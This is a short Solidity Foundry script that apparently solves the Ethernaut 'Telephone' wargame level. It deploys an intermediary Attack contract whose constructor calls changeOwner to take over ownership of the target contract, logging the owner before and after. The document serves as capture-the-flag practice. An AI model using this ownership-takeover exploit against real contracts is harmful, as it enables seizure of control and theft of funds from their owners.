// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Telephone} from "../src/04_Telephone.sol";
import {Script, console} from "forge-std/Script.sol";

contract TelephoneSolve is Script {
    Telephone telephone = Telephone(0xe50494b29731a070d9c38c339a786D4426e2Eb41);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Telephone Owner Before#", telephone.owner());
        new Attack(address(telephone));
        console.log("Telephone Owner After#", telephone.owner());
        vm.stopBroadcast();
    }
}

contract Attack {
    constructor(address telephone) {
        Telephone(telephone).changeOwner(msg.sender);
    }
}
